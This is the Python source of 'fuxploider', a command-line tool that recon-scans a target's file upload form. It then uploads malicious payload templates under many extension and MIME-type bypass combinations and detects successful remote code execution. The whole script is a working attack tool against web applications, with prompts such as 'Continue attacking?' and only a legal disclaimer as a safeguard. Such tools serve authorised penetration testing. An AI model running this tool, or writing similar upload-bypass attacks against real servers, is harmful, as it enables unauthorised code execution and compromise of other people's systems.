#!/usr/bin/python3
import re,requests,argparse,logging,os,coloredlogs,datetime,getpass,tempfile,itertools,json
from utils import *
from UploadForm import UploadForm
signal.signal(signal.SIGINT, quitting)
version = "0.2.2"
logging.basicConfig(datefmt='[%m/%d/%Y-%H:%M:%S]')
logger = logging.getLogger("fuxploider")

coloredlogs.install(logger=logger,fmt='%(asctime)s %(levelname)s - %(message)s',level=logging.INFO)
logging.getLogger("requests").setLevel(logging.ERROR)

#################### TEMPLATES DEFINITION HERE ######################
templatesFolder = "payloads"
with open("templates.json","r") as fd :
	templates = json.loads(fd.read())
#######################################################################
templatesNames = [x["templateName"] for x in templates]
templatesSection = "[TEMPLATES]\nTemplates are malicious payloads meant to be uploaded on the scanned remote server. Code execution detection is done based on the expected output of the payload."
templatesSection += "\n\tDefault templates are the following (name - description) : "
for t in templates :
	templatesSection+="\n\t  * '"+t["templateName"]+"' - "+t["description"]

parser = argparse.ArgumentParser(epilog=templatesSection,description=__doc__, formatter_class=argparse.RawTextHelpFormatter)
parser.add_argument("-d", "--data", metavar="postData",dest="data", help="Additionnal data to be transmitted via POST method. Example : -d \"key1=value1&key2=value2\"", type=valid_postData)
parser.add_argument("--proxy", metavar="proxyUrl", dest="proxy", help="Proxy information. Example : --proxy \"user:password@proxy.host:8080\"", type=valid_proxyString)
parser.add_argument("--proxy-creds",metavar="credentials",nargs='?',const=True,dest="proxyCreds",help="Prompt for proxy credentials at runtime. Format : 'user:pass'",type=valid_proxyCreds)
parser.add_argument("-f","--filesize",metavar="integer",nargs=1,default=["10"],dest="size",help="File size to use for files to be created and uploaded (in kB).")
parser.add_argument("--cookies",metavar="omnomnom",nargs=1,dest="cookies",help="Cookies to use with HTTP requests. Example : PHPSESSID=aef45aef45afeaef45aef45&JSESSID=AQSEJHQSQSG",type=valid_postData)
parser.add_argument("--uploads-path",default=[None],metavar="path",nargs=1,dest="uploadsPath",help="Path on the remote server where uploads are put. Example : '/tmp/uploads/'")
parser.add_argument("-t","--template",metavar="templateName",nargs=1,dest="template",help="Malicious payload to use for code execution detection. Default is to use every known templates. For a complete list of templates, see the TEMPLATE section.")
parser.add_argument("-r","--regex-override",metavar="regex",nargs=1,dest="regexOverride",help="Specify a regular expression to detect code execution. Overrides the default code execution detection regex defined in the template in use.",type=valid_regex)
requiredNamedArgs = parser.add_argument_group('Required named arguments')
requiredNamedArgs.add_argument("-u","--url", metavar="target", dest="url",required=True, help="Web page URL containing the file upload form to be tested. Example : http://test.com/index.html?action=upload", type=valid_url)
requiredNamedArgs.add_argument("--not-regex", metavar="regex", help="Regex matching an upload failure", type=valid_regex,dest="notRegex")
requiredNamedArgs.add_argument("--true-regex",metavar="regex", help="Regex matching an upload success", type=valid_regex, dest="trueRegex")

exclusiveArgs = parser.add_mutually_exclusive_group()
exclusiveArgs.add_argument("-l","--legit-extensions",metavar="listOfExtensions",dest="legitExtensions",nargs=1,help="Legit extensions expected, for a normal use of the form, comma separated. Example : 'jpg,png,bmp'")
exclusiveArgs.add_argument("-n",metavar="n",nargs=1,default=["100"],dest="n",help="Number of common extensions to use. Example : -n 100", type=valid_nArg)

exclusiveVerbosityArgs = parser.add_mutually_exclusive_group()
exclusiveVerbosityArgs.add_argument("-v",action="store_true",required=False,dest="verbose",help="Verbose mode")
exclusiveVerbosityArgs.add_argument("-vv",action="store_true",required=False,dest="veryVerbose",help="Very verbose mode")
exclusiveVerbosityArgs.add_argument("-vvv",action="store_true",required=False,dest="veryVeryVerbose",help="Much verbose, very log, wow.")

parser.add_argument("-s","--skip-recon",action="store_true",required=False,dest="skipRecon",help="Skip recon phase, where fuxploider tries to determine what extensions are expected and filtered by the server. Needs -l switch.")
parser.add_argument("-y",action="store_true",required=False,dest="detectAllEntryPoints",help="Force detection of every entry points without asking to continue each time one is found.")

args = parser.parse_args()
args.uploadsPath = args.uploadsPath[0]

if args.template :
	args.template = args.template[0]
	if args.template not in templatesNames :
		logging.warning("Unknown template : %s",args.template)
		cont = input("Use default templates instead ? [Y/n]")
		if not cont.lower().startswith("y") :
			exit()
	else :
		templates = [[x for x in templates if x["templateName"] == args.template][0]]
if args.regexOverride :
	for t in templates :
		t["codeExecRegex"] = args.regexOverride[0]

args.verbosity = 0
if args.verbose :
	args.verbosity = 1
if args.veryVerbose :
	args.verbosity = 2
if args.veryVeryVerbose :
	args.verbosity = 3
logger.verbosity = args.verbosity
if args.verbosity > 0 :
	coloredlogs.install(logger=logger,fmt='%(asctime)s %(levelname)s - %(message)s',level=logging.DEBUG)


if args.proxyCreds and args.proxy == None :
	parser.error("--proxy-creds must be used with --proxy.")

if args.skipRecon and args.legitExtensions == None :
	parser.error("-s switch needs -l switch. Cannot skip recon phase without any known entry point.")

args.n = int(args.n[0])
args.size = int(args.size[0])
args.size = 1024*args.size

if not args.notRegex and not args.trueRegex :
	parser.error("At least one detection method must be provided, either with --not-regex or with --true-regex.")

if args.legitExtensions :
	args.legitExtensions = args.legitExtensions[0].split(",")

if args.cookies :
	args.cookies = postDataFromStringToJSON(args.cookies[0])

print("""\033[1;32m
                                     
 ___             _     _   _         
|  _|_ _ _ _ ___| |___|_|_| |___ ___ 
|  _| | |_'_| . | | . | | . | -_|  _|
|_| |___|_,_|  _|_|___|_|___|___|_|  
            |_|                      

\033[1m\033[42m{version """+version+"""}\033[m

\033[m[!] legal disclaimer : Usage of fuxploider for attacking targets without prior mutual consent is illegal. It is the end user's responsibility to obey all applicable local, state and federal laws. Developers assume no liability and are not responsible for any misuse or damage caused by this program
	""")
if args.proxyCreds == True :
	args.proxyCreds = {}
	args.proxyCreds["username"] = input("Proxy username : ")
	args.proxyCreds["password"] = getpass.getpass("Proxy password : ")

now = datetime.datetime.now()

print("[*] starting at "+str(now.hour)+":"+str(now.minute)+":"+str(now.second))

#mimeFile = "mimeTypes.advanced"
mimeFile = "mimeTypes.basic"
extensions = loadExtensions("file",mimeFile)
tmpLegitExt = []
if args.legitExtensions :
	args.legitExtensions = [x.lower() for x in args.legitExtensions]
	foundExt = [a[0] for a in extensions]
	for b in args.legitExtensions :
		if b in foundExt :
			tmpLegitExt.append(b)
		else :
			logging.warning("Extension %s can't be found as a valid/known extension with associated mime type.",b)
args.legitExtensions = tmpLegitExt

postData = postDataFromStringToJSON(args.data)

s = requests.Session()
if args.cookies :
	for key in args.cookies.keys() :
		s.cookies[key] = args.cookies[key]

##### PROXY HANDLING #####
s.trust_env = False
if args.proxy :
	if args.proxy["username"] and args.proxy["password"] and args.proxyCreds :
		logging.warning("Proxy username and password provided by the --proxy-creds switch replaces credentials provided using the --proxy switch")
	if args.proxyCreds :
		proxyUser = args.proxyCreds["username"]
		proxyPass = args.proxyCreds["password"]
	else :
		proxyUser = args.proxy["username"]
		proxyPass = args.proxy["password"]
	proxyProtocol = args.proxy["protocol"]
	proxyHostname = args.proxy["hostname"]
	proxyPort = args.proxy["port"]
	proxy = ""
	if proxyProtocol != None :
		proxy += proxyProtocol+"://"
	else :
		proxy += "http://"

	if proxyUser != None and proxyPass != None :
		proxy += proxyUser+":"+proxyPass+"@"

	proxy += proxyHostname
	if proxyPort != None :
		proxy += ":"+proxyPort

	if proxyProtocol == "https" :
		proxies = {"https":proxy}
	else :
		proxies = {"http":proxy,"https":proxy}

	s.proxies.update(proxies)
#########################################################

up = UploadForm(args.notRegex,args.trueRegex,s,args.size,postData,args.uploadsPath)
up.setup(args.url)
#########################################################

############################################################
uploadURL = up.uploadUrl
fileInput = {"name":up.inputName}

###### VALID EXTENSIONS DETECTION FOR THIS FORM ######
if not args.skipRecon :
	if len(args.legitExtensions) > 0 :
		n = up.detectValidExtensions(extensions,args.n,args.legitExtensions)
	else :
		n = up.detectValidExtensions(extensions,args.n)
	logger.info("### Tried %s extensions, %s are valid.",n,len(up.validExtensions))
else :
	logger.info("### Skipping detection of valid extensions, using provided extensions instead (%s)",args.legitExtensions)
	up.validExtensions = args.legitExtensions

if up.validExtensions == [] :
	logger.error("No valid extension found.")
	exit()

entryPoints = []
with open("techniques.json","r") as rawTechniques :
	techniques = json.loads(rawTechniques.read())

##############################################################################################################################################
##############################################################################################################################################
logger.info("### Starting code execution detection (messing with file extensions and mime types...)")
wantToStop = False
for template in templates :
	if wantToStop :
		break
	logger.debug("Template in use : %s",template)

	templatefd = open(templatesFolder+"/"+template["filename"],"rb")
	nastyExt = template["nastyExt"]
	nastyMime = getMime(extensions,nastyExt)
	nastyExtVariants = template["extVariants"]

	attempts = []
	nbOfValidExtensions = len(up.validExtensions)
	nbOfEntryPointsFound = 0
	i = 0
	while not wantToStop and i < nbOfValidExtensions :
		legitExt = up.validExtensions[i]
		legitMime = getMime(extensions,legitExt)
		#exec all known techniques
		##	for each variant of the code execution trigerring extension (php,asp etc)
		### using either bad or good mime type
		listOfExtensionsTmp = [nastyExt]+nastyExtVariants
		listOfExtensions = listOfExtensionsTmp

		for nastyVariant in listOfExtensions :
			for t in techniques :
				mime = legitMime if t["mime"] == "legit" else nastyMime
				suffix = t["suffix"].replace("$legitExt$",legitExt).replace("$nastyExt$",nastyVariant)
				attempts.append({"suffix":suffix,"mime":mime})

		for a in attempts :
			suffix = a["suffix"]
			mime = a["mime"]

			res = up.submitTestCase(suffix,mime,templatefd.read(),template["codeExecRegex"])
			templatefd.seek(0)
			if res["codeExec"] :
				logging.info("\033[1m\033[42mCode execution obtained ('%s','%s','%s')\033[m",suffix,mime,template["filename"])
				nbOfEntryPointsFound += 1
				foundEntryPoint = a
				foundEntryPoint["template"] = template["filename"]
				entryPoints.append(foundEntryPoint)
				if not args.detectAllEntryPoints :
					cont = input("Continue attacking ? [y/N] : ")
					if not cont.lower().startswith("y") :
						wantToStop = True
						break
		i += 1
	templatefd.close()
print()
logging.info("%s entry point(s) found using %s HTTP requests.",nbOfEntryPointsFound,up.httpRequests)
print("Found the following entry points : ")
print(entryPoints)